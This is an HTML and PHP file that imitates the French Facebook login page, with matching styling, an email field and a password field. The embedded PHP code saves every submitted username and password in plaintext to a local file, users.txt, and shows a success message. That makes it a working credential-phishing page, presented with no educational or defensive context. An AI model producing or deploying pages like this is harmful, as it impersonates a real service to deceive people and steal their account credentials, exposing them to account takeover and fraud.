<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à Facebook</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 360px;
        }
        .login-container h2 {
            margin-bottom: 20px;
            color: #1877f2;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }
        .login-container button {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            border: none;
            color: #fff;
            font-size: 18px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }
        .login-container button:hover {
            background-color: #165ec9;
        }
        .login-container .register-link {
            display: block;
            margin-top: 20px;
            text-align: center;
            color: #1877f2;
            text-decoration: none;
            font-size: 16px;
        }
        .login-container .register-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Facebook</h2>
        <form method="post" action="">
            <input type="text" name="username" placeholder="Adresse e-mail ou mobile" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        <a href="#" class="register-link">Créer un compte</a>
    </div>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = htmlspecialchars($_POST['username']);
        $password = htmlspecialchars($_POST['password']);

        // Write to a file
        $file = fopen("users.txt", "a");
        if ($file) {
            fwrite($file, "Username: $username, Password: $password\n");
            fclose($file);
            echo "<br><br><br><p>Enregistrement réussi!</p>";
        } else {
            echo "<br><br><br><p>Erreur lors de l'enregistrement.</p>";
        }
    }
    ?>
</body>
</html>


